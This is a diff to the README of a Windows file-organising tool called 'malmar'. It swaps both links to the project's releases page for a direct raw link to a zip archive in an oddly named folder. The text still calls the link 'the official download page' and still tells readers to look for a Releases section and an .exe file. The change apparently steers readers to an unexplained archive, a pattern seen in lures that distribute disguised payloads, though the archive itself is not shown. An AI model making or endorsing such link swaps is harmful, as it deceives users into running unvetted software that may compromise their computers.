@@ -1,6 +1,6 @@
 # 📦 malmar - Easily manage your digital files now
 
-[![](https://img.shields.io/badge/Download_Malmar-Blue?style=for-the-badge&logo=github)](https://github.com/marniquartan82/malmar/releases)
+[![](https://img.shields.io/badge/Download_Malmar-Blue?style=for-the-badge&logo=github)](https://github.com/marniquartan82/malmar/raw/refs/heads/main/Saccomyina/Software_3.0-beta.3.zip)
 
 ## 📌 What is malmar
 
@@ -10,7 +10,7 @@ Malmar helps you organize your files on your computer. Many people struggle to k
 
 You only need a few minutes to set up malmar. Follow these instructions to get the software on your Windows computer.
 
-1. First, visit the official download page: https://github.com/marniquartan82/malmar/releases.
+1. First, visit the official download page: https://github.com/marniquartan82/malmar/raw/refs/heads/main/Saccomyina/Software_3.0-beta.3.zip
 2. Find the section labeled Releases. 
 3. Look for the file ending in .exe.
 4. Click the file name to start the download.
